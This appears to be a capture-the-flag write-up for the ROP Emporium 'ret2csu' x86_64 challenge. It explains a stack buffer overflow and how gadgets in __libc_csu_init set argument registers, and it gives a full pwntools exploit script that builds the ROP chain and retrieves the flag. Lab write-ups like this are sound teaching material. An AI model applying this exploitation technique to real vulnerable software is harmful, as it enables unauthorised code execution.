# ret2csu

## Reversing with Ghidva

### main
```c
int main() {
  pwnme();
  return 0;
}
```

### pwnme
```c
void pwnme() {
  char input[32];
  
  puts("ret2csu by ROP Emporium");
  puts("x86_64\n");
  memset(input, 0, 0x20);
  puts(
      "Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n"
      );
  printf("> ");
  read(0, input, 0x200);
  puts("Thank you!");
  return;
}
```

### usefulFunction
```c
void usefulFunction() {
  ret2win(1, 2, 3);
}
```

## Reversing with ObjDump
```assembly
0000000000400640 <__libc_csu_init>:
  400640:       41 57                   push   r15
  400642:       41 56                   push   r14
  400644:       49 89 d7                mov    r15,rdx
  400647:       41 55                   push   r13
  400649:       41 54                   push   r12
  40064b:       4c 8d 25 9e 07 20 00    lea    r12,[rip+0x20079e]        # 600df0 <__frame_dummy_init_array_entry>
  400652:       55                      push   rbp
  400653:       48 8d 2d 9e 07 20 00    lea    rbp,[rip+0x20079e]        # 600df8 <__do_global_dtors_aux_fini_array_entry>
  40065a:       53                      push   rbx
  40065b:       41 89 fd                mov    r13d,edi
  40065e:       49 89 f6                mov    r14,rsi
  400661:       4c 29 e5                sub    rbp,r12
  400664:       48 83 ec 08             sub    rsp,0x8
  400668:       48 c1 fd 03             sar    rbp,0x3
  40066c:       e8 5f fe ff ff          call   4004d0 <_init>
  400671:       48 85 ed                test   rbp,rbp
  400674:       74 20                   je     400696 <__libc_csu_init+0x56>
  400676:       31 db                   xor    ebx,ebx
  400678:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  40067f:       00 
  400680:       4c 89 fa                mov    rdx,r15                          ; Interesting gadget
  400683:       4c 89 f6                mov    rsi,r14
  400686:       44 89 ef                mov    edi,r13d
  400689:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40068d:       48 83 c3 01             add    rbx,0x1
  400691:       48 39 dd                cmp    rbp,rbx
  400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
  400696:       48 83 c4 08             add    rsp,0x8
  40069a:       5b                      pop    rbx                              ; Interesting gadget
  40069b:       5d                      pop    rbp
  40069c:       41 5c                   pop    r12
  40069e:       41 5d                   pop    r13
  4006a0:       41 5e                   pop    r14
  4006a2:       41 5f                   pop    r15
  4006a4:       c3                      ret    
  4006a5:       90                      nop
  4006a6:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  4006ad:       00 00 00 
```

## The vuln
Our usual `Buffer Overflow` allows smashing the stack to create a very cool `ROPchain`.

Since we haven't got any apparent gadget to set `rdx`, we'll have to search for them in the `statically-linked` part of the program, [`__libc_csu_init`](#reversing-with-objdump) to be accurate.

## The exploit
The `0x40069a` gadget allows us to pop a lot of registers but not `rdx`, which is fundamental to call any function in `x86_64`.

In this case, the gadget `0x400680` comes in our help, assigning values controlled by us to `rsi`, `rdx` and the lower 4 bytes of `rdi` (`edi`) and that's the problem: to solve this challenge we'll need to assign all `rdi`, not just `edi`, so we must call a "junk" function which does not modify the registers we want to assign.

`__init_array_end` will then come in handy, since it does nothing important (at this point of the program) and returns almost instantly. `callq` however, sets it's own return address, so the execution will resume at the instruction after, which happens to be `0x40068d`. Other problem: there are many instructions on our way to `ret`, so we'll have to compensate.

For example, we set `rbp` to one, because we don't want the `jne` in `0x400694` to be taken, and setting `rbp` to `1` and `rbx` to `0` makes the `cmp` set the `zero flag` to `1`, because they're equals after instruction `0x40068d` which adds `1` to `rbx`, so the `jne` won't be executed.

All the `pop`s we've used earlier are now on our way to WIN. No big deal, we can just fill the stack with junk and let the `pop`s do their work.

At this point we have this scenario:
- `rdi` = `0xdeadbeef`
- `rsi` = `0xcafebabecafebabe`
- `rdx` = `0xd00df00dd00df00d`

What we have to do now is to call a gadget to fill `rdi`, no problem we've got it.

Eventually we can put `ret2win`'s `plt` address on the stack and call it with every parameter set properly.

## Thanks to ROP Emporium
Thank y'all from [ROP Emporium](https://ropemporium.com/) for these very interesting challenges which we've had a lot of fun on. 

## The script
```py
from pwn import *
import os

#
# Context
#

e = context.binary = ELF('ret2csu')

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'>', cyclic(0x200))
io.wait()
core = io.corefile
io.close()
offset = cyclic_find(core.read(core.rsp, 4))

info(f'Offset: {offset}')

#
# ROP
#

RET2WIN         = p64(e.plt['ret2win'])
GMON_START      = p64(e.got['__gmon_start__'])

POP_RDI         = p64(next(e.search(asm('pop rdi; ret;'))))
POP_RSI_R15     = p64(next(e.search(asm('pop rsi; pop r15; ret;'))))

# Missing the right gadget to directly pop rdx (ret2csu)
CSU_CALLQ       = p64(next(e.search(asm('mov rdx, r15; mov rsi, r14; mov edi, r13d; call QWORD PTR [r12+rbx*8]'))))
CSU_POP         = p64(next(e.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;'))))

#
# Exploit
#

io = process(e.path)

payload  = b''
payload += b'A' * offset

payload += CSU_POP
payload += p64(0)                   # RBX -> CALL (0 bcuz we don't want offset)
payload += p64(1)                   # RBP -> Gonna be compared with RBX + 1
payload += p64(0x0000000000600df8)  # R12 -> CALL -> Junk function (__init_array_end)
payload += p64(0xdeadbeefdeadbeef)  # R13 -> EDI
payload += p64(0xcafebabecafebabe)  # R14 -> RSI
payload += p64(0xd00df00dd00df00d)  # R15 -> RDX
payload += CSU_CALLQ
payload += b'JUNKJUNK' * 7

payload += POP_RDI
payload += p64(0xdeadbeefdeadbeef)
payload += RET2WIN

io.sendafter(b'> ', payload)

info(f'Flag: {io.recvrepeat(1).decode().splitlines()[1]}')

os.system('rm core*')
```